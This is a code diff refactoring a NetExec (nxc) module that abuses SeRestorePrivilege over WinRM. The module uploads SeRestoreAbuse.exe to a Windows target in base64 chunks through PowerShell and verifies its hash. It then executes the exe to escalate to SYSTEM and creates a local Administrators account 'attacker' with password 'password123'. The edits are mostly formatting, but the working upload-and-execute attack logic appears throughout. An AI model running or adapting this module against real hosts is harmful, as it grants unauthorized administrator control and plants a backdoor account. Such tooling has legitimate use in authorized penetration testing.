@@ -1,14 +1,6 @@
-# SeRestoreAbuse module for nxc (WinRM)
-# SeRestoreAbuse: https://github.com/rhymenaucerous/SeRestoreAbuse
-# Abuses SeRestorePrivilege to escalate to SYSTEM via the seclogon service.
-# Creates a local user "attacker" with password "password123" in the Administrators group.
-#
-# Designed for WinRM so that non-admin users with SeRestorePrivilege
-# (e.g. Backup Operators) can run the exploit remotely.
-
 import base64
 import hashlib
-import sys
+from textwrap import dedent
 from os import path
 
 from nxc.helpers.misc import CATEGORY
@@ -18,6 +10,15 @@ CHUNK_SIZE = 32000  # PowerShell command length limit workaround
 
 
 class NXCModule:
+    """
+    SeRestoreAbuse module for nxc (WinRM)
+    SeRestoreAbuse: https://github.com/rhymenaucerous/SeRestoreAbuse
+    Abuses SeRestorePrivilege to escalate to SYSTEM via the seclogon service.
+    Creates a local user "attacker" with password "password123" in the Administrators group.
+
+    Designed for WinRM so that non-admin users with SeRestorePrivilege
+    (e.g. Backup Operators) can run the exploit remotely.
+    """
     name = "se_restore_abuse"
     description = "Abuse SeRestorePrivilege to escalate to SYSTEM via seclogon (creates local admin user attacker:password123)"
     supported_protocols = ["winrm"]
@@ -48,7 +49,7 @@ class NXCModule:
         # Verify the exe exists locally
         if not path.isfile(self.exe_path):
             context.log.fail(f"SeRestoreAbuse.exe not found at '{self.exe_path}'")
-            sys.exit(1)
+            return
 
         remote_path = f"{self.tmp_dir}{self.exe_name}"
 
@@ -58,9 +59,7 @@ class NXCModule:
         exe_b64 = base64.b64encode(exe_bytes).decode()
 
         # Upload via PowerShell — write base64-decoded bytes to disk
-        context.log.display(
-            f"Uploading {self.exe_name} to {self.tmp_dir} via PowerShell"
-        )
+        context.log.display(f"Uploading {self.exe_name} to {self.tmp_dir} via PowerShell")
         # Split into chunks to avoid command-line length limits
         chunks = []
         for i in range(0, len(exe_b64), CHUNK_SIZE):
@@ -74,15 +73,15 @@ class NXCModule:
 
             # Append remaining chunks if any
             for chunk in chunks[1:]:
-                append_cmd = (
-                    f'$d = "{chunk}"; '
-                    f'$existing = [IO.File]::ReadAllBytes("{remote_path}"); '
-                    f"$new = [Convert]::FromBase64String($d); "
-                    f"$combined = New-Object byte[] ($existing.Length + $new.Length); "
-                    f"[Array]::Copy($existing, $combined, $existing.Length); "
-                    f"[Array]::Copy($new, 0, $combined, $existing.Length, $new.Length); "
-                    f'[IO.File]::WriteAllBytes("{remote_path}", $combined)'
-                )
+                append_cmd = dedent(f"""
+                    $d = "{chunk}";
+                    $existing = [IO.File]::ReadAllBytes("{remote_path}");
+                    $new = [Convert]::FromBase64String($d);
+                    $combined = New-Object byte[] ($existing.Length + $new.Length);
+                    [Array]::Copy($existing, $combined, $existing.Length);
+                    [Array]::Copy($new, 0, $combined, $existing.Length, $new.Length);
+                    [IO.File]::WriteAllBytes("{remote_path}", $combined)
+                """).strip()
                 connection.execute(append_cmd, True, shell_type="powershell")
 
             context.log.success(f"SeRestoreAbuse.exe uploaded to {remote_path}")
@@ -99,24 +98,14 @@ class NXCModule:
             if remote_hash:
                 remote_hash = remote_hash.strip().lower()
             if remote_hash != local_hash:
-                context.log.fail(
-                    f"Upload failed — hash mismatch (local: {local_hash}, remote: {remote_hash})"
-                )
+                context.log.fail(f"Upload failed — hash mismatch (local: {local_hash}, remote: {remote_hash})")
                 # Clean up the bad file
-                connection.execute(
-                    f'Remove-Item -Path "{remote_path}" -Force',
-                    True,
-                    shell_type="powershell",
-                )
+                connection.execute(f'Remove-Item -Path "{remote_path}" -Force', True, shell_type="powershell")
                 return
             context.log.success(f"Hash verified: {local_hash}")
         except Exception as e:
             context.log.fail(f"Upload failed — could not verify hash: {e}")
-            connection.execute(
-                f'Remove-Item -Path "{remote_path}" -Force',
-                True,
-                shell_type="powershell",
-            )
+            connection.execute(f'Remove-Item -Path "{remote_path}" -Force', True, shell_type="powershell")
             return
 
         # Execute SeRestoreAbuse.exe
@@ -128,21 +117,15 @@ class NXCModule:
             if output:
                 for line in output.splitlines():
                     context.log.highlight(line)
-                context.log.success(
-                    "SeRestoreAbuse.exe executed — check output above (expected: attacker:password123 added to Administrators)"
-                )
+                context.log.success("SeRestoreAbuse.exe executed — check output above (expected: attacker:password123 added to Administrators)")
             else:
-                context.log.display("Command executed but no output returned")
+                context.log.fail("Command executed but no output returned")
         except Exception as e:
             context.log.fail(f"Error executing command: {e}")
         finally:
             # Clean up — delete the exe from the target
             try:
-                connection.execute(
-                    f'Remove-Item -Path "{remote_path}" -Force',
-                    True,
-                    shell_type="powershell",
-                )
+                connection.execute(f'Remove-Item -Path "{remote_path}" -Force', True, shell_type="powershell")
                 context.log.success(f"SeRestoreAbuse.exe deleted from {remote_path}")
             except Exception as e:
                 context.log.fail(f"Error deleting {self.exe_name}: {e}")
